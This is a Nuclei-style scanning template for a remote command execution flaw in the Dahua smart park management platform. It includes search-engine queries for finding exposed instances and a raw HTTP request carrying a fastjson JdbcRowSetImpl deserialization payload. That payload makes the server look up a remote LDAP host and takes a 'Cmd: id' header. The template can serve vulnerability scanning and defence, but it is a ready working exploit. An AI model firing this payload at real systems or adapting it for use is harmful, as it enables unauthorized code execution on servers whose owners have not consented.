id: dahua-wpms-ipms-fastjson-rce

info:
  name: 大华智慧园区综合管理平台 pay - 远程命令执行
  author: leadlife
  severity: critical
  description: 
  reference:
    - todo
  metadata:
    verified: true
    fofa-qeury: app="dahua-智慧园区综合管理平台"
    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
  tags: dahua,rce,wpms,oob

http:
  - raw:
      - |
        POST /ipms/barpay/pay HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15
        Cmd: id
        Content-Type: application/json
        Accept-Encoding: gzip
        Content-Length: 104
        
        {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://{{interactsh-url}}", "autoCommit": true}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or